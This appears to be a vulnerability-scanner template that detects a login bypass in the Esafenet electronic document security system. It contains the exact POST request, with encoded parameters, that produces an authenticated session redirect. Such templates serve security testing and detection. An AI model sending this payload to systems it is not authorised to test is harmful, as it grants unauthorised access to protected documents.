id: poc-yaml-yisaitong-esafenet-linkfilterservice-login
info:
  name: 亿赛通电子文档安全管理系统 登录验证绕过漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 权限绕过
  description: |
    This template detects a login bypass vulnerability in 亿赛通电子文档安全管理系统 by analyzing specific headers and response code.

http:
  - method: POST
    path:
      - "{{BaseURL}}/CDGServer3/LinkFilterService"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: header
        words:
          - "/CDGServer3/frame.jsp;jsessionid="
      - type: word
        part: header
        words:
          - "Set-Cookie: CDGServerLanguage="
